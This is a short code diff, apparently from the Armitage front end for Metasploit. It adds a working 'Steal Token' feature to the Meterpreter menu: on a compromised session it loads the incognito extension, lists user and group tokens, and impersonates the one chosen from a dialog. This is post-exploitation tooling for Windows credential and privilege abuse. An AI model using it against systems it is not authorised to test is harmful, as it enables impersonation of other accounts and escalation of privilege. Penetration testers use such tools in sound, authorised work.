@@ -169,7 +169,41 @@ sub showMeterpreterMenu {
 		}, $sid => "$sid"));
 
 		item($j, "Steal Token", "S", lambda({
-			showError("Yes!@##?");
+			%handlers["list_tokens"] = lambda({
+				$watch['value'] += 1;
+
+				if ($0 eq "update" && '\\' isin $2) {
+					%tokens[$2] = %(Token => $2, Type => $type);
+				}
+				else if ($0 eq "update") {
+					if ("Delegation" isin $2) {
+						$type = "Delegation";
+					}
+					else if ("Impersonation" isin $2) {
+						$type = "Impersonation";
+					}
+				}
+				else if ($0 eq "end" && $show is $null) {
+					$show = 1;
+					thread(lambda({
+						# keep going and wait for watch value to stay at 0 for 3.5s
+						while ($watch['value'] > 0) {
+							$watch['value'] = 0;
+							yield 3500;
+						}
+
+						# ok, now we can display the tokens...
+						quickListDialog("Steal Token $sid", "Impersonate", @("Token", "Token", "Type"), values(%tokens), $width => 480, $height => 240, lambda({
+							oneTimeShow("impersonate_token");
+							m_cmd($sid, "impersonate_token ' $+ $1 $+ '");
+						}, \$sid));
+					}, \$sid, \%tokens, \$watch));
+				}
+			}, \$sid, %tokens => ohash(), $show => $null, $watch => %(value => 1), $type => "");
+
+			m_cmd($sid, "use incognito");
+			m_cmd($sid, "list_tokens -u");
+			m_cmd($sid, "list_tokens -g");
 		}, $sid => "$sid"));
 
 		item($j, "Dump Hashes", "D", lambda({
